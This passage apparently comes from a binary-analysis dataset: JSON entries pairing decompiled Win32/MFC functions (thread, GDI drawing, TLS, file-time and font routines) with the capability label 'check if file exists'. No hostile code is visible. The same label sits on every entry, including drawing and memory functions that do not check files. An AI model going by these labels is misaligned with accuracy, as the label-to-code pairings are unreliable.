        "decompiled_code": "\nint32_t * __cdecl fcn.00425e83(uint arg_8h, uint arg_ch, uint arg_10h, uint32_t arg_14h, uint arg_18h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    \n    piVar1 = fcn.00430654();\n    if (piVar1 == NULL) {\n        fcn.00418fe6();\n    }\n    piVar1[0xd] = 0;\n    iVar2 = fcn.00425d1b(arg_14h | 4, arg_10h, arg_18h);\n    if (iVar2 == 0) {\n        (**(*piVar1 + 0x78))();\n        piVar1 = NULL;\n    }\n    else {\n        (*_sym.imp.KERNEL32.dll_SetThreadPriority)(piVar1[0xb], arg_ch);\n        if (((arg_14h & 4) == 0) && (iVar2 = (*_sym.imp.KERNEL32.dll_ResumeThread)(piVar1[0xb]),  iVar2 == -1)) {\n            fcn.0041901a();\n        }\n    }\n    return piVar1;\n}\n",
        "token_count": 262
    },
    "004268c4": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl fcn.004268c4(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    int32_t arg_10h_00;\n    int32_t unaff_EBP;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.00458e45(4);\n    uVar1 = fcn.00423280();\n    fcn.00401680(uVar1);\n    *(unaff_EBP + -4) = 0;\n    fcn.00402ed0(*(unaff_EBP + 8));\n    arg_10h_00 = *(unaff_EBP + 0x10);\n    if (arg_10h_00 == -1) {\n        arg_10h_00 = *(unaff_EBP + 8);\n    }\n    fcn.0042687b(*(unaff_EBP + -0x10), *(unaff_EBP + 0xc), arg_10h_00);\n    fcn.004010d0();\n    fcn.00458f1d();\n    return;\n}\n",
        "token_count": 277
    },
    "00428560": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: nWidth\n// WARNING: Variable defined which should be unmapped: nHeight\n\nvoid __cdecl fcn.00428560(uint wParam)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t extraout_ECX;\n    int32_t unaff_EBP;\n    uint nWidth;\n    uint nHeight;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.00458e45(0x18);\n    if (*(unaff_EBP + 8) != -1) {\n        uVar2 = fcn.0042eab6();\n        (*_sym.imp.USER32.dll_GetClientRect)(*(extraout_ECX + 0x20), unaff_EBP + -0x24);\n        *(unaff_EBP + -0x10) = 0;\n        *(unaff_EBP + -0x14) = vtable.CRgn.0;\n        *(unaff_EBP + -4) = 0;\n        uVar3 = (*_sym.imp.GDI32.dll_CreateRectRgnIndirect)(unaff_EBP + -0x24);\n        fcn.0041a54f(uVar3);\n        uVar3 = (*_sym.imp.USER32.dll_GetDC)(*(extraout_ECX + 0x20));\n        iVar4 = fcn.0041a27a(uVar3);\n        fcn.00419e24(unaff_EBP + -0x14);\n        (*_sym.imp.USER32.dll_SendMessageA)(*(extraout_ECX + 0x20), 0x198, *(unaff_EBP + 8), unaff_EBP + -0x24);\n        iVar1 = *(unaff_EBP + -0x20);\n        *(unaff_EBP + -0x20) = *(unaff_EBP + -0x20) + -2;\n        *(unaff_EBP + -0x18) = iVar1 + 2;\n        uVar2 = fcn.0041a6e8(uVar2);\n        (*_sym.imp.GDI32.dll_PatBlt)\n                  (*(iVar4 + 4), *(unaff_EBP + -0x24), *(unaff_EBP + -0x20), *(unaff_EBP + -0x1c) - *(unaff_EBP + -0x24)\n                   , *(unaff_EBP + -0x18) - *(unaff_EBP + -0x20), 0x5a0049);\n        fcn.0041a6e8(uVar2);\n        (*_sym.imp.USER32.dll_ReleaseDC)(*(extraout_ECX + 0x20), *(iVar4 + 4));\n        *(unaff_EBP + -4) = 0xffffffff;\n        *(unaff_EBP + -0x14) = vtable.CGdiObject.0;\n        fcn.0041a5a2();\n    }\n    fcn.00458f1d();\n    return;\n}\n",
        "token_count": 774
    },
    "00428865": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00428865(uint arg_8h, uint arg_ch, uint arg_10h, int32_t arg_14h, int32_t arg_18h)\n\n{\n    int32_t in_ECX;\n    uint32_t var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    int32_t var_ch;\n    \n    var_14h = arg_ch;\n    var_1ch = arg_10h;\n    var_20h = 5;\n    if (arg_14h != -1) {\n        var_20h = 7;\n        var_18h = arg_14h;\n    }\n    if (arg_18h != -1) {\n        var_20h = var_20h | 8;\n        var_ch = arg_18h;\n    }\n    (*_sym.imp.USER32.dll_SendMessageA)(*(in_ECX + 0x20), 0x101b, arg_8h, &var_20h);\n    return;\n}\n",
        "token_count": 234
    },
    "0042b21f": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.0042b21f(void)\n\n{\n    uint *puVar1;\n    code *pcVar2;\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.00458e45(4);\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    *extraout_ECX = vtable.AFX_MODULE_STATE.0;\n    puVar1 = extraout_ECX[0x12];\n    *(unaff_EBP + -4) = 1;\n    if (puVar1 != NULL) {\n        (***puVar1)(1);\n    }\n    if (extraout_ECX[0x1c] != NULL) {\n        (**(*extraout_ECX[0x1c] + 0xc))(extraout_ECX + 0x13);\n        if (extraout_ECX[0x1c] != NULL) {\n            (**(*extraout_ECX[0x1c] + 4))(1);\n        }\n    }\n    if (*extraout_ECX[0x1e] != NULL) {\n        (****extraout_ECX[0x1e])(1);\n    }\n    if (*(extraout_ECX[0x1e] + 4) != NULL) {\n        (****(extraout_ECX[0x1e] + 4))(1);\n    }\n    fcn.004170df(extraout_ECX[0x1e]);\n    pcVar2 = extraout_ECX[0x20];\n    if ((pcVar2 != NULL) && (pcVar2 != 0xffffffff)) {\n        fcn.0042abad(pcVar2);\n        extraout_ECX[0x20] = 0xffffffff;\n    }\n    *(unaff_EBP + -4) = 0;\n    fcn.004315f2();\n    fcn.004010d0();\n    fcn.00458f1d();\n    return;\n}\n",
        "token_count": 456
    },
    "0043128d": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.0043128d(int32_t *param_1)\n\n{\n    code *pcVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    uint uStack12;\n    \n    param_1[5] = 0;\n    param_1[6] = 4;\n    param_1[1] = 0;\n    param_1[2] = 1;\n    param_1[3] = 0;\n    param_1[4] = 0;\n    iVar3 = (*_sym.imp.KERNEL32.dll_TlsAlloc)();\n    *param_1 = iVar3;\n    if (iVar3 == -1) {\n        uStack12 = 0x4a8560;\n        fcn.00456b8d(&stack0xfffffff4, 0x49eca0);\n        pcVar1 = swi(3);\n        piVar2 = (*pcVar1)();\n        return piVar2;\n    }\n    uStack12 = 0x4312c8;\n    (*_sym.imp.KERNEL32.dll_InitializeCriticalSection)();\n    return param_1;\n}\n",
        "token_count": 251
    },
    "00431622": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00431622(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    int32_t arg_8h;\n    uint uVar2;\n    \n    arg_8h = param_1[5];\n    while (arg_8h != 0) {\n        iVar1 = *(arg_8h + 4);\n        fcn.0043147a(arg_8h, 0);\n        arg_8h = iVar1;\n    }\n    if (*param_1 != -1) {\n        (*_sym.imp.KERNEL32.dll_TlsFree)(*param_1);\n    }\n    if (param_1[4] != 0) {\n        uVar2 = (*_sym.imp.KERNEL32.dll_GlobalHandle)(param_1[4]);\n        (*_sym.imp.KERNEL32.dll_GlobalUnlock)(uVar2);\n        (*_sym.imp.KERNEL32.dll_GlobalFree)(uVar2);\n    }\n    (*_sym.imp.KERNEL32.dll_DeleteCriticalSection)(param_1 + 7);\n    return;\n}\n",
        "token_count": 229
    },
    "00431847": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00431847(int32_t param_1, int32_t **param_2, int32_t *param_3, int32_t *param_4)\n\n{\n    int32_t **ppiVar1;\n    int32_t extraout_ECX;\n    uint32_t uVar2;\n    int32_t *piVar3;\n    uint32_t uVar4;\n    int32_t *piVar5;\n    \n    piVar3 = *param_2;\n    if (piVar3 != NULL) {\n        if (piVar3 == 0xffffffff) {\n            uVar4 = 0;\n            if (*(param_1 + 8) != 0) {\n                ppiVar1 = *(param_1 + 4);\n                do {\n                    piVar3 = *ppiVar1;\n                    if (piVar3 != NULL) goto code_r0x00431877;\n                    uVar4 = uVar4 + 1;\n                    ppiVar1 = ppiVar1 + 1;\n                } while (uVar4 < *(param_1 + 8));\n                fcn.0041901a();\n                param_1 = extraout_ECX;\n            }\n        }\ncode_r0x00431877:\n        piVar5 = *piVar3;\n        if (piVar5 == NULL) {\n            uVar4 = *(param_1 + 8);\n            uVar2 = (piVar3[1] >> 4) % uVar4 + 1;\n            if (uVar2 < uVar4) {\n                ppiVar1 = *(param_1 + 4) + uVar2 * 4;\n                do {\n                    piVar5 = *ppiVar1;\n                    if (piVar5 != NULL) break;\n                    uVar2 = uVar2 + 1;\n                    ppiVar1 = ppiVar1 + 1;\n                } while (uVar2 < uVar4);\n            }\n        }\n        *param_2 = piVar5;\n        *param_3 = piVar3[1];\n        *param_4 = piVar3[2];\n    }\n    return;\n}\n",
        "token_count": 466
    },
    "00434a11": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.00434a11(int32_t *arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *in_ECX;\n    ulong uVar3;\n    \n    iVar1 = in_ECX[2];\n    if (iVar1 == 0) {\n        if (arg_ch == 0) {\n            *arg_8h = 0;\n            arg_8h[1] = -0x80000000;\n        }\n        else {\n            if (((arg_ch != -1) || (*in_ECX != 0)) || (in_ECX[1] != -0x80000000)) {\n                uVar3 = fcn.0045d3c0(*in_ECX, in_ECX[1], arg_ch, arg_ch >> 0x1f);\n                *arg_8h = uVar3;\n                arg_8h[1] = uVar3 >> 0x20;\n                arg_8h[2] = 0;\n                return arg_8h;\n            }\n            *arg_8h = -1;\n            arg_8h[1] = 0x7fffffff;\n        }\n        arg_8h[2] = 1;\n    }\n    else {\n        iVar2 = in_ECX[1];\n        *arg_8h = *in_ECX;\n        arg_8h[1] = iVar2;\n        arg_8h[2] = iVar1;\n    }\n    return arg_8h;\n}\n",
        "token_count": 343
    },
    "004398cc": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004398cc(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    bool bVar3;\n    \n    bVar3 = false;\n    if (*(param_1 + 4) != -1) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_CloseHandle)(*(param_1 + 4));\n        bVar3 = iVar1 == 0;\n    }\n    *(param_1 + 4) = 0xffffffff;\n    *(param_1 + 8) = 0;\n    fcn.004016d0();\n    if (bVar3) {\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)(*(param_1 + 0xc));\n        fcn.0044558c(uVar2);\n    }\n    return;\n}\n",
        "token_count": 183
    },
    "00439b0d": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.00439b0d(void)\n\n{\n    code **extraout_ECX;\n    uint *in_FS_OFFSET;\n    uint uStackY532;\n    uint in_stack_fffffe08;\n    \n    fcn.00458e78();\n    *extraout_ECX = vtable.CFile.0;\n    if ((extraout_ECX[1] != 0xffffffff) && (extraout_ECX[2] != NULL)) {\n        fcn.004398cc();\n    }\n    fcn.004010d0();\n    *in_FS_OFFSET = uStackY532;\n    fcn.004566a8(in_stack_fffffe08);\n    return;\n}\n",
        "token_count": 145
    },
    "0043ad02": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0043ad02(int32_t *arg_8h, uint32_t arg_ch, int32_t *arg_10h)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    \n    if (arg_10h == NULL) {\n        fcn.0041901a();\n    }\n    puVar1 = (**(*arg_8h + 0x3c))();\n    do {\n        if (puVar1 == NULL) {\n            return 0;\n        }\n        for (iVar2 = puVar1[1]; *(iVar2 + 0x18) != 0xffffffff; iVar2 = iVar2 + 0x28) {\n            if ((*(iVar2 + 4) == arg_10h[1]) && (*(iVar2 + 0x18) == (*arg_10h != 0))) {\n                if (*(iVar2 + 0x24) == 0xffffffff) {\n                    if (*(iVar2 + 0x20) == 0xffffffff) {\n                        return iVar2;\n                    }\n                    if (*(iVar2 + 0x20) == arg_ch) {\n                        return iVar2;\n                    }\n                }\n                else if ((*(iVar2 + 0x20) < arg_ch || *(iVar2 + 0x20) == arg_ch) && (arg_ch <= *(iVar2 + 0x24))) {\n                    return iVar2;\n                }\n            }\n        }\n        puVar1 = *puVar1;\n    } while( true );\n}\n",
        "token_count": 330
    },
    "0043d804": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint fcn.0043d804(uint *param_1, uint *param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    param_1[4] = param_2[4];\n    iVar1 = param_2[4];\n    if (iVar1 == 0) {\n        *param_1 = *param_2;\n        param_1[1] = param_2[1];\n        param_1[2] = param_2[2];\n        param_1[3] = param_2[3];\n    }\n    else {\n        if (iVar1 == 1) {\n            *param_1 = *param_2;\n            param_1[1] = param_2[1];\n            param_1[2] = param_2[2];\n            param_1[3] = param_2[3];\n            param_1[5] = param_2[5];\n            return 1;\n        }\n        if (iVar1 != 2) {\n            return 1;\n        }\n    }\n    iVar1 = fcn.00458ff6(param_2[5]);\n    iVar2 = fcn.00417ac0(2, iVar1 + 1);\n    param_1[5] = iVar2;\n    if (iVar2 != 0) {\n        fcn.0045842b(iVar2, iVar1 + 1, param_2[5]);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 327
    },
    "004447e3": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004447e3(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t in_ECX;\n    int32_t iVar4;\n    \n    iVar1 = arg_8h;\n    iVar4 = 0;\n    if (-1 < arg_8h) goto code_r0x004447f9;\n    do {\n        fcn.0041901a();\ncode_r0x004447f9:\n        if (iVar4 <= arg_ch) {\n            *(in_ECX + 0x10) = arg_ch;\n        }\n        if (iVar1 == iVar4) {\n            fcn.004170df(*(in_ECX + 4));\n            *(in_ECX + 0xc) = iVar4;\n            *(in_ECX + 8) = iVar4;\n            goto code_r0x004448e9;\n        }\n        if (*(in_ECX + 4) == iVar4) {\n            uVar2 = fcn.004170b4(iVar1);\n            *(in_ECX + 4) = uVar2;\n            fcn.00459330(uVar2, iVar4, iVar1);\n            *(in_ECX + 0xc) = iVar1;\ncode_r0x00444860:\n            *(in_ECX + 8) = iVar1;\n            return;\n        }\n        iVar4 = *(in_ECX + 0xc);\n        if (iVar1 <= iVar4) {\n            iVar4 = *(in_ECX + 8);\n            if (iVar4 < iVar1) {\n                fcn.00459330(iVar4 + *(in_ECX + 4), 0, iVar1 - iVar4);\n            }\n            goto code_r0x00444860;\n        }\n        iVar3 = *(in_ECX + 0x10);\n        if (iVar3 == 0) {\n            iVar3 = *(in_ECX + 8) + (*(in_ECX + 8) >> 0x1f & 7U) >> 3;\n            if (iVar3 < 4) {\ncode_r0x00444892:\n                iVar3 = 4;\n            }\n            else if (iVar3 < 0x401) {\n                if (iVar3 < 4) goto code_r0x00444892;\n            }\n            else {\n                iVar3 = 0x400;\n            }\n        }\n        arg_8h = iVar3 + iVar4;\n        if (iVar3 + iVar4 <= iVar1) {\n            arg_8h = iVar1;\n        }\n    } while (arg_8h < iVar4);\n    iVar4 = fcn.004170b4(arg_8h);\n    fcn.00417b17(iVar4, arg_8h, *(in_ECX + 4), *(in_ECX + 8));\n    fcn.00459330(*(in_ECX + 8) + iVar4, 0, iVar1 - *(in_ECX + 8));\n    fcn.004170df(*(in_ECX + 4));\n    *(in_ECX + 8) = iVar1;\n    *(in_ECX + 0xc) = arg_8h;\ncode_r0x004448e9:\n    *(in_ECX + 4) = iVar4;\n    return;\n}\n",
        "token_count": 736
    },
    "004461fc": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __thiscall fcn.004461fc(int32_t *param_1, uint param_2, uint param_3)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0041e5da();\n    if ((iVar1 != -1) && (iVar1 = (**(*param_1 + 0x15c))(param_2, param_3),  iVar1 != 0)) {\n        (*_sym.imp.USER32.dll_PostMessageA)(param_1[8], 0x362, 0xe001, 0);\n        (**(*param_1 + 0x148))(1);\n        return 0;\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 152
    },
    "00448dbd": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00448dbd(uint32_t *arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint32_t uVar3;\n    uint32_t *puVar4;\n    int32_t in_ECX;\n    uint var_20h;\n    uint lpLastWriteTime;\n    uint lpLastAccessTime;\n    uint lpCreationTime;\n    \n    fcn.00459330(arg_8h, 0, 0x128);\n    fcn.00417b55(arg_8h + 0x22, 0x104, *(in_ECX + 0xc), 0xffffffff);\n    if (*(in_ECX + 4) == *0x48f1dc) {\ncode_r0x00448f0c:\n        uVar2 = 1;\n    }\n    else {\n        iVar1 = (*_sym.imp.KERNEL32.dll_GetFileTime)\n                          (*(in_ECX + 4), &lpCreationTime, &lpLastAccessTime, &lpLastWriteTime);\n        if (iVar1 != 0) {\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetFileSize)(*(in_ECX + 4), 0);\n            arg_8h[6] = uVar3;\n            arg_8h[7] = 0;\n            if (uVar3 != 0xffffffff) {\n                if (*(*(in_ECX + 0xc) + -0xc) == 0) {\n                    *(arg_8h + 8) = 0;\n                }\n                else {\n                    iVar1 = (*_sym.imp.KERNEL32.dll_GetFileAttributesA)(*(in_ECX + 0xc));\n                    *(arg_8h + 8) = (iVar1 == -1) - 1U & iVar1;\n                }\n                iVar1 = fcn.004489a5(&lpCreationTime);\n                if (iVar1 == 0) {\n                    *arg_8h = 0;\n                    arg_8h[1] = 0;\n                }\n                else {\n                    puVar4 = fcn.004489d4(&lpCreationTime, 0xffffffff);\n                    *arg_8h = *puVar4;\n                    arg_8h[1] = puVar4[1];\n                }\n                iVar1 = fcn.004489a5(&lpLastAccessTime);\n                if (iVar1 == 0) {\n                    arg_8h[4] = 0;\n                    arg_8h[5] = 0;\n                }\n                else {\n                    puVar4 = fcn.004489d4(&lpLastAccessTime, 0xffffffff);\n                    arg_8h[4] = *puVar4;\n                    arg_8h[5] = puVar4[1];\n                }\n                iVar1 = fcn.004489a5(&lpLastWriteTime);\n                if (iVar1 == 0) {\n                    arg_8h[2] = 0;\n                    arg_8h[3] = 0;\n                }\n                else {\n                    puVar4 = fcn.004489d4(&lpLastWriteTime, 0xffffffff);\n                    arg_8h[2] = *puVar4;\n                    arg_8h[3] = puVar4[1];\n                }\n                if ((*arg_8h | arg_8h[1]) == 0) {\n                    *arg_8h = arg_8h[2];\n                    arg_8h[1] = arg_8h[3];\n                }\n                if ((arg_8h[4] | arg_8h[5]) == 0) {\n                    arg_8h[4] = arg_8h[2];\n                    arg_8h[5] = arg_8h[3];\n                }\n                goto code_r0x00448f0c;\n            }\n        }\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 860
    },
    "004490cf": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint fcn.004490cf(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    if (**(param_1 + 8) == -1) {\n        for (iVar1 = *(param_1 + 4); *(iVar1 + 0x18) != -1; iVar1 = iVar1 + 0x20) {\n        }\n        **(param_1 + 8) = iVar1 - *(param_1 + 4) >> 5;\n    }\n    return **(param_1 + 8);\n}\n",
        "token_count": 121
    },
    "0044946f": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0044946f(uint *arg_8h, uint arg_ch)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint *puVar4;\n    int32_t var_4h;\n    \n    var_4h = 0;\n    do {\n        if (arg_8h == NULL) {\n            return 0xffffffff;\n        }\n        puVar4 = arg_8h[1];\n        uVar1 = fcn.004490cf();\n        uVar3 = 0;\n        if (uVar1 != 0) {\n            do {\n                if ((*(puVar4 + 3) != 0xfff) && (iVar2 = fcn.0041cec7(*puVar4, arg_ch),  iVar2 == 0)) {\n                    if (puVar4[1] != 0xffffffff) {\n                        return puVar4[1];\n                    }\n                    return var_4h << 0x10 | uVar3 + 1 & 0xffff;\n                }\n                puVar4 = puVar4 + 8;\n                uVar3 = uVar3 + 1;\n            } while (uVar3 < uVar1);\n        }\n        arg_8h = *arg_8h;\n        var_4h = var_4h + 1;\n    } while( true );\n}\n",
        "token_count": 307
    },
    "004494dc": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004494dc(int32_t *arg_8h, uint32_t arg_ch)\n\n{\n    uint *arg_8h_00;\n    uint *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    bool bVar5;\n    \n    arg_8h_00 = (**(*arg_8h + 0x30))();\n    bVar5 = arg_ch == 0;\n    puVar4 = arg_8h_00;\n    if (bVar5) {\n        for (; puVar4 != NULL; puVar4 = *puVar4) {\n            for (puVar1 = puVar4[1]; puVar1[6] != -1; puVar1 = puVar1 + 8) {\n                if (*(puVar1 + 3) == 0xfff) {\n                    arg_ch = puVar1[1];\n                    if ((arg_ch == 0xffffffff) && (arg_ch = fcn.0044946f(arg_8h_00, *puVar1),  arg_ch == 0xffffffff)) {\n                        return 0;\n                    }\n                    bVar5 = arg_ch == 0;\n                    goto code_r0x00449533;\n                }\n            }\n        }\n    }\n    else {\ncode_r0x00449533:\n        if ((!bVar5 && -1 < arg_ch) && (uVar2 = 0,  arg_8h_00 != NULL)) {\n            puVar4 = arg_8h_00;\n            do {\n                if (arg_ch >> 0x10 <= uVar2) break;\n                puVar4 = *puVar4;\n                uVar2 = uVar2 + 1;\n            } while (puVar4 != NULL);\n            if (puVar4 != NULL) {\n                uVar2 = fcn.004490cf(puVar4);\n                if ((arg_ch & 0xffff) <= uVar2) {\n                    iVar3 = puVar4[1] + ((arg_ch & 0xffff) * 8 + -8) * 4;\n                    if (*(iVar3 + 4) == 0xffffffff) {\n                        return iVar3;\n                    }\n                    if (*(iVar3 + 4) == arg_ch) {\n                        return iVar3;\n                    }\n                }\n            }\n        }\n    }\n    do {\n        if (arg_8h_00 == NULL) {\n            return 0;\n        }\n        for (iVar3 = arg_8h_00[1]; *(iVar3 + 0x18) != -1; iVar3 = iVar3 + 0x20) {\n            if (*(iVar3 + 4) == arg_ch) {\n                return iVar3;\n            }\n        }\n        arg_8h_00 = *arg_8h_00;\n    } while( true );\n}\n",
        "token_count": 625
    },
    "0044d1eb": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t fcn.0044d1eb(void)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    uint uVar3;\n    int32_t iVar4;\n    \n    if (*0x4a9b8c == -1) {\n        uVar2 = (*_sym.imp.USER32.dll_GetDC)(0);\n        uVar3 = (*_sym.imp.USER32.dll_GetSystemMetrics)(0x48, 0, 0, 0, 400, 0, 0, 0, 2, 0, 0, 0, 0, \"Marlett\");\n        iVar4 = (*_sym.imp.GDI32.dll_CreateFontA)(uVar3);\n        pcVar1 = _sym.imp.GDI32.dll_SelectObject;\n        if (iVar4 != 0) {\n            (*_sym.imp.GDI32.dll_SelectObject)(uVar2, iVar4);\n        }\n        (*_sym.imp.GDI32.dll_GetCharWidthA)(uVar2, 0x36, 0x36, 0x4a9b8c);\n        if (iVar4 != 0) {\n            (*pcVar1)(uVar2, uVar3);\n            (*_sym.imp.GDI32.dll_DeleteObject)(iVar4);\n        }\n        (*_sym.imp.USER32.dll_ReleaseDC)(0, uVar2);\n    }\n    return *0x4a9b8c;\n}\n",
        "token_count": 312
    },
    "0044e62c": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.0044e62c(void)\n\n{\n    uint uVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    \n    iVar4 = *0x4a9b88;\n    if (*0x4a9b88 == -1) {\n        fcn.0042b7b9();\n        uVar1 = fcn.0041e3b1();\n        pcVar2 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1, \"DllGetVersion\");\n        iVar4 = 0x40000;\n        if (pcVar2 != NULL) {\n            fcn.00459330(&var_14h, 0, 0x14);\n            var_14h = 0x14;\n            iVar3 = (*pcVar2)(&var_14h);\n            if (-1 < iVar3) {\n                iVar4 = CONCAT22(var_10h, var_ch);\n            }\n        }\n    }\n    *0x4a9b88 = iVar4;\n    return iVar4;\n}\n",
        "token_count": 266
    },
    "0044f53c": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __thiscall fcn.0044f53c(int32_t param_1, int32_t param_2, uint *param_3)\n\n{\n    uint uVar1;\n    \n    if ((*(param_1 + 4) == -1) || (*(param_1 + 4) != param_2)) {\n        *param_3 = 0;\n        uVar1 = 0;\n    }\n    else {\n        *param_3 = *(param_1 + 8);\n        (**(**(param_1 + 8) + 4))(*(param_1 + 8));\n        uVar1 = 1;\n    }\n    return uVar1;\n}\n",
        "token_count": 147
    },
    "004540b7": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: lplpsz\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl\nfcn.004540b7(uint arg_8h, uint pszExeFileName, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h)\n\n{\n    char *pcVar1;\n    int32_t iVar2;\n    int32_t unaff_EBP;\n    uint lplpsz;\n    uint var_10h;\n    char *var_4h;\n    \n    fcn.00458e45(8);\n    var_4h = unaff_EBP + -0x14;\n    (*_sym.imp.ole32.dll_StringFromCLSID)(*(unaff_EBP + 0xc), var_4h);\n    iVar2 = fcn.004308a4(*(unaff_EBP + -0x14));\n    if (iVar2 == 0) goto code_r0x004542da;\n    fcn.00453d1d(0, iVar2);\n    fcn.00453d1d(1, *(unaff_EBP + 0x10));\n    (*_sym.imp.ole32.dll_CoTaskMemFree)(iVar2);\n    fcn.00423280();\n    fcn.00401680();\n    *(unaff_EBP + -4) = 0;\n    iVar2 = fcn.0042b7b9();\n    fcn.00439df5(*(iVar2 + 8), unaff_EBP + -0x10);\n    fcn.00453d1d();\n    fcn.00453d1d();\n    fcn.00453d1d();\n    fcn.0042b7b9();\n    fcn.00453d1d();\n    fcn.00423280();\n    fcn.00401680();\n    *(unaff_EBP + -4) = 1;\n    if (*(unaff_EBP + 0x1c) != 0) {\n        *(unaff_EBP + 0xc) = *(unaff_EBP + -0x10);\n        